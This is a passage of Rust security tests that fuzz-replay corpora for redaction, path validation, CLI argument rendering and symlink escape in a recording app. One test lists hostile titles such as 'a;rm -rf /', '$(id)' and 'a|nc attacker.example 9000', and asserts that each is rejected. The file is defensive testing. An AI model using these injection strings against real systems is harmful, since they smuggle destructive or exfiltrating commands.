    /// instead of duplicated, so both suites exercise the same bytes.
    ///
    /// Returns `None` when the sibling fixture is not present.
    fn shared_hostile_names() -> Option<Vec<String>> {
        let path = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../tests/fixtures/hostile-paths/names.txt");
        let text = std::fs::read_to_string(path).ok()?;
        let names: Vec<String> = text
            .lines()
            .filter(|l| !l.is_empty() && !l.starts_with('#'))
            .map(decode_hostile_line)
            .collect();
        if names.is_empty() {
            None
        } else {
            Some(names)
        }
    }

    /// Decode one line of the shared corpus. The grammar is documented in the
    /// fixture header and is exactly `\\`, `\n`, `\r`, `\t`, `\0` and
    /// `\u{XXXX}`; the fixture requires a decoder to fail loudly on anything
    /// else rather than silently pass a mangled name, so every other escape is
    /// a panic. Leading and trailing spaces are significant and are kept.
    fn decode_hostile_line(line: &str) -> String {
        let mut out = String::with_capacity(line.len());
        let mut chars = line.chars();
        while let Some(c) = chars.next() {
            if c != '\\' {
                out.push(c);
                continue;
            }
            match chars.next() {
                Some('\\') => out.push('\\'),
                Some('n') => out.push('\n'),
                Some('r') => out.push('\r'),
                Some('t') => out.push('\t'),
                Some('0') => out.push('\0'),
                Some('u') => {
                    assert_eq!(chars.next(), Some('{'), "malformed \\u escape in {line:?}");
                    let mut hex = String::new();
                    loop {
                        match chars.next() {
                            Some('}') => break,
                            Some(h) => hex.push(h),
                            None => panic!("unterminated \\u escape in {line:?}"),
                        }
                    }
                    assert!(
                        !hex.is_empty() && hex.len() <= 6,
                        "\\u escape must carry 1-6 hex digits in {line:?}"
                    );
                    let code = u32::from_str_radix(&hex, 16)
                        .unwrap_or_else(|e| panic!("bad \\u{{{hex}}} in {line:?}: {e}"));
                    let decoded = char::from_u32(code).unwrap_or_else(|| {
                        panic!("\\u{{{hex}}} in {line:?} is not a Unicode scalar value")
                    });
                    out.push(decoded);
                }
                other => panic!("unsupported escape \\{other:?} in {line:?}"),
            }
        }
        out
    }

    #[test]
    fn corpus_directories_exist_for_every_wired_target() {
        for target in [
            "cli_arg_render",
            "destination_url",
            "redactor",
            "path_validation",
            "archive_entry",
            "error_envelope",
            "domain_redactor",
            "opus_packet",
            "embedding_blob",
        ] {
            let dir = corpus_dir(target);
            assert!(dir.is_dir(), "missing corpus directory {}", dir.display());
        }
    }

    #[test]
    fn error_envelope_corpus_holds_its_invariants() {
        let n = replay("error_envelope", checks::check_error_envelope);
        assert!(n >= 50, "error_envelope corpus shrank to {n} entries");
    }

    #[test]
    fn domain_redactor_corpus_holds_its_invariants() {
        let n = replay("domain_redactor", checks::check_domain_redactor);
        assert!(n >= 30, "domain_redactor corpus shrank to {n} entries");
    }

    /// The full §16.2 leak invariants over the same corpus.
    ///
    /// Ignored because of a defect in a crate EPIC D does not own, not because
    /// the invariant is wrong: `plaudon_domain::error::Redactor` only matches a
    /// URL scheme at the *start* of a whitespace-delimited token, and its
    /// `looks_like_opaque_secret` requires every character of the token to be
    /// `[A-Za-z0-9_-]`, so `(https://…signed…)`, `url=https://…` and a dotted
    /// JWT all survive verbatim. The assertions below are written as the
    /// contract should hold and will pass unchanged once the fix lands — there
    /// is no inverted assertion and nothing asserts the buggy behaviour.
    ///
    /// Reproducers live in `tests/fixtures/fuzz-corpus/domain_redactor/`:
    /// `url_in_parentheses`, `url_in_quotes_signed`, `url_in_angle_brackets`,
    /// `url_after_equals`, `url_no_space_prefix`, `nul_bytes`, `jwt_like`.
    #[test]
    #[ignore = "EPIC B defect: plaudon_domain Redactor::looks_like_opaque_secret rejects tokens containing '.', '+', '/'; reported to Team-AB, tracked as a threat-model open finding"]
    fn domain_redactor_redacts_separator_bearing_credentials() {
        let n = replay("domain_redactor", checks::check_domain_redactor_strict);
        assert!(n >= 30, "domain_redactor corpus shrank to {n} entries");
    }

    /// Every code in the closed §15.4 set must survive a full envelope
    /// round-trip, so the corpus spread cannot silently miss a variant that
    /// fails to serialize.
    #[test]
    fn every_error_code_round_trips_through_an_envelope() {
        use plaudon_domain::error::{AppErrorCode, ErrorEnvelope};
        use plaudon_domain::ids::DiagnosticId;

        for code in AppErrorCode::ALL {
            let envelope = ErrorEnvelope {
                code: *code,
                message: code.canonical_message().to_owned(),
                retryable: code.is_retryable(),
                action: code.action(),
                diagnostic_id: DiagnosticId::new(),
            };
            let encoded = serde_json::to_string(&envelope).expect("envelope serializes");
            checks::check_error_envelope(encoded.as_bytes());
            let back: ErrorEnvelope =
                serde_json::from_str(&encoded).expect("envelope deserializes");
            assert_eq!(back, envelope);
        }
        assert_eq!(
            AppErrorCode::ALL.len(),
            58,
            "the closed error-code set changed size"
        );
    }

    #[test]
    fn cli_arg_render_corpus_holds_its_invariants() {
        let n = replay("cli_arg_render", checks::check_cli_arg_render);
        assert!(n >= 30, "cli_arg_render corpus shrank to {n} entries");
    }

    #[test]
    fn destination_url_corpus_holds_its_invariants() {
        let n = replay("destination_url", checks::check_destination_url);
        assert!(n >= 30, "destination_url corpus shrank to {n} entries");
    }

    #[test]
    fn redactor_corpus_holds_its_invariants() {
        let n = replay("redactor", checks::check_redactor);
        assert!(n >= 20, "redactor corpus shrank to {n} entries");
    }

    /// VOICE_PROFILES_SPEC VP-112 / VP-185: nothing the redactor is handed
    /// comes out still carrying a speaker embedding, and the §6.3A response
    /// guard refuses an embedding-bearing document.
    #[test]
    fn embedding_blob_corpus_holds_its_invariants() {
        let n = replay("embedding_blob", checks::check_embedding_blob);
        assert!(n >= 17, "embedding_blob corpus shrank to {n} entries");

        // The rule has a limit, and the limit is part of the contract: a note
        // that only *discusses* embeddings is not an embedding and must come
        // through a sink byte for byte. Without this, "nothing survived" could
        // be satisfied by a redactor that ate every record.
        let prose = std::fs::read_to_string(
            corpus_dir("embedding_blob").join("benign_prose_mentions_embeddings"),
        )
        .expect("the benign corpus entry must be readable UTF-8");
        assert_eq!(
            plaudon_diagnostics::Redactor::new().redact(&prose),
            prose,
            "prose about embeddings was redacted"
        );
    }

    #[test]
    fn path_validation_corpus_holds_its_invariants() {
        let n = replay("path_validation", checks::check_path_validation);
        assert!(n >= 40, "path_validation corpus shrank to {n} entries");
    }

    #[test]
    fn archive_entry_corpus_holds_its_invariants() {
        let n = replay("archive_entry", checks::check_archive_entry);
        assert!(n >= 25, "archive_entry corpus shrank to {n} entries");
    }

    /// §16.2 "Malicious audio decoder input": the Opus packet decoder added
    /// by O1.6 (#214) over the committed packet corpus — real packets from
    /// the fixtures, plus the framing shapes RFC 6716 forbids.
    #[test]
    fn opus_packet_corpus_holds_its_invariants() {
        let n = replay("opus_packet", checks::check_opus_packet);
        assert!(n >= 15, "opus_packet corpus shrank to {n} entries");
    }

    /// §18.5 hostile filenames: the shared D2.2 corpus must also be safe to
    /// push through filename sanitization and path validation.
    #[test]
    fn shared_hostile_names_are_safe_as_paths() {
        let Some(names) = shared_hostile_names() else {
            eprintln!(
                "note: tests/fixtures/hostile-paths/names.txt is absent; \
                 replaying only tests/fixtures/fuzz-corpus/path_validation/"
            );
            return;
        };
        for name in &names {
            checks::check_path_validation(name.as_bytes());
        }
        assert_ne!(
            names.len(),
            0,
            "the shared hostile-name fixture decoded to nothing"
        );
    }

    /// §18.5: the same hostile names the path guard is tested with must also be
    /// safe to push through the CLI argument renderer, because a recording
    /// title becomes both a filename and a CLI value.
    #[test]
    fn shared_hostile_names_are_safe_as_cli_arguments() {
        let Some(names) = shared_hostile_names() else {
            // Not a silent skip: our own corpus already covers the §18.6A
            // hostile cases for this target, and the shared list is additive.
            eprintln!(
                "note: tests/fixtures/hostile-paths/names.txt is absent; \
                 replaying only tests/fixtures/fuzz-corpus/cli_arg_render/"
            );
            return;
        };
        for name in &names {
            checks::check_cli_arg_render(name.as_bytes());
        }
        assert_ne!(
            names.len(),
            0,
            "the shared hostile-name fixture decoded to nothing"
        );
    }

    /// A hostile display name must never be renderable as a CLI identifier:
    /// this is the concrete §16.2 "malicious titles" case.
    #[test]
    fn malicious_titles_never_render_as_identifiers() {
        for title in [
            "--delete-all",
            "-rf",
            "a;rm -rf /",
            "`id`",
            "$(id)",
            "a|nc attacker.example 9000",
            "a&whoami",
            "a>/etc/passwd",
            "list\nupload --all",
            "rec\u{0}--delete-all",
            "%SYSTEMROOT%",
            "two words",
            "a'b",
            "a\"b",
        ] {
            let rendered =
                plaudon_security::outbound::subprocess::CliArg::Identifier(title.to_owned())
                    .render();
            assert!(
                rendered.is_err(),
                "hostile title {title:?} was accepted as a CLI identifier"
            );
        }
    }

    /// §18.5 "test hostile filenames **and symlinks**". The corpus alone
    /// cannot express a symlink, so this is a real on-disk fixture: a link
    /// inside the permitted root that points outside it must not validate, and
    /// a traversal through that link must not validate either.
    #[cfg(unix)]
    #[test]
    fn symlink_out_of_the_root_is_refused() {
        use plaudon_security::fsguard::{canonicalize_and_validate, PathPolicy};

        let root = tempfile::Builder::new()
            .prefix("plaudon-fuzz-symlink")
            .tempdir()
            .expect("temp root");
        let outside = tempfile::Builder::new()
            .prefix("plaudon-fuzz-outside")
            .tempdir()
            .expect("temp outside");
        let canonical_root = root.path().canonicalize().expect("canonical root");
        let canonical_outside = outside.path().canonicalize().expect("canonical outside");
        std::fs::write(canonical_outside.join("secret.txt"), b"secret").expect("write secret");

        let link = canonical_root.join("escape");
        std::os::unix::fs::symlink(&canonical_outside, &link).expect("create symlink");

        let policy = PathPolicy::for_roots([canonical_root.clone()]);

        let through_link = canonicalize_and_validate(&policy, &link.join("secret.txt"));
        assert!(
            through_link.is_err(),
            "a symlink pointing out of the root resolved to {:?}",
            through_link.map(|v| v.as_path().to_path_buf())
        );

        let link_itself = canonicalize_and_validate(&policy, &link);
        assert!(
            link_itself.is_err(),
            "the escaping symlink itself validated as {:?}",
            link_itself.map(|v| v.as_path().to_path_buf())
        );

        // A real file inside the root must still validate, so the rule is not
        // simply "reject everything".
        let inside = canonical_root.join("recording.m4a");
        std::fs::write(&inside, b"bytes").expect("write inside");
        let ok = canonicalize_and_validate(&policy, &inside).expect("a real file inside the root");
        assert!(ok.as_path().starts_with(&canonical_root));
    }

    /// The allocation meter must actually be wired up, otherwise the
    /// "bounded allocation" assertion would be vacuous in this build.
    #[test]
    fn allocation_meter_observes_allocations() {
        checks::alloc_meter::start();
        let v: Vec<u8> = vec![7u8; 4 << 20];
        assert_eq!(v.len(), 4 << 20);
        let peak = checks::alloc_meter::stop();
        assert!(peak >= 4 << 20, "counting allocator saw only {peak} B");
    }
}
